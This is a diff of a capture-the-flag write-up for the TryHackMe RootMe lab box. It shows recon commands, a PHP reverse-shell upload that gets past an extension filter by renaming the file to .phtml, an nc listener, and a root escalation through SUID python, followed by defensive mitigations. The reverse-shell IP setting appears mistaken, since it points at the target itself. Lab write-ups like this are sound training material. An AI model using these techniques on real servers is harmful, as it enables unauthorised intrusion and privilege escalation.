@@ -34,7 +34,7 @@ RootMe is a beginner-friendly Linux box built around two core concepts: file upl
 Started with a service scan to map the attack surface:
 
 ```bash
-nmap -sV 10.10.110.118
+kie@kiepc:~/THM/RootMe$ nmap -sV 10.10.110.118
 ```
 
 **Result:** Two services — SSH on 22 and Apache on 80. Web server is the obvious entry point.
@@ -42,7 +42,7 @@ nmap -sV 10.10.110.118
 Moved straight to directory brute-forcing to find anything interesting:
 
 ```bash
-gobuster dir -u 10.10.110.118 -w /root/Desktop/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
+kie@kiepc:~/THM/RootMe$ gobuster dir -u http://10.10.110.118 -w /root/Desktop/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
 **Key Finding:** `/uploads` directory exposed alongside a file upload panel. That's the foothold.
@@ -54,7 +54,7 @@ gobuster dir -u 10.10.110.118 -w /root/Desktop/Tools/wordlists/dirbuster/directo
 Grabbed pentestmonkey's PHP reverse shell and updated the connection details:
 
 ```bash
-# Edit the shell before uploading
+# Edit these two lines before uploading
 $ip = '10.10.110.118';
 $port = 9001;
 ```
@@ -64,7 +64,7 @@ Attempted a direct `.php` upload — server rejected it. The filter is blocking 
 Renamed to `.phtml` — PHP still executes it, the filter doesn't catch it:
 
 ```bash
-mv php_reverse_shell.php php_reverse_shell.phtml
+kie@kiepc:~/THM/RootMe$ mv php_reverse_shell.php php_reverse_shell.phtml
 ```
 
 **Result:** Upload succeeded.
@@ -72,7 +72,7 @@ mv php_reverse_shell.php php_reverse_shell.phtml
 Set up a listener:
 
 ```bash
-nc -lvnp 9001
+kie@kiepc:~/THM/RootMe$ nc -lvnp 9001
 ```
 
 Navigated to `/uploads` in the browser and triggered the shell. Connection caught immediately.
@@ -80,14 +80,13 @@ Navigated to `/uploads` in the browser and triggered the shell. Connection caugh
 Stabilised the TTY to get a usable shell:
 
 ```bash
-which python
-python -c 'import pty;pty.spawn("/bin/bash")'
+kie@kiepc:~/THM/RootMe$ python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
 Located the user flag:
 
 ```bash
-find / -type f -name user.txt 2>/dev/null
+kie@kiepc:~/THM/RootMe$ find / -type f -name user.txt 2>/dev/null
 ```
 
 ---
@@ -97,13 +96,13 @@ find / -type f -name user.txt 2>/dev/null
 Standard enumeration — searched for SUID binaries:
 
 ```bash
-find / -perm -u=s -type f 2>/dev/null
+kie@kiepc:~/THM/RootMe$ find / -perm -u=s -type f 2>/dev/null
 ```
 
 **Critical Finding:** `/usr/bin/python` has the SUID bit set. Python with SUID is an instant root — GTFOBins covers this exactly.
 
 ```bash
-/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+kie@kiepc:~/THM/RootMe$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
 
 **Result:** Root shell. The `-p` flag preserves the elevated EUID so privileges aren't dropped on spawn.
@@ -151,7 +150,7 @@ find / -perm -u=s -type f 2>/dev/null
 ### Defensive Mitigations
 - Replace extension blocklist with strict allowlist on upload endpoints
 - Audit SUID binaries regularly — remove SUID from interpreters unless explicitly required
-- Deploy web application firewall rules to detect reverse shell patterns
+- Deploy WAF rules to detect reverse shell patterns
 - Monitor outbound connections from web server processes
 
 ---
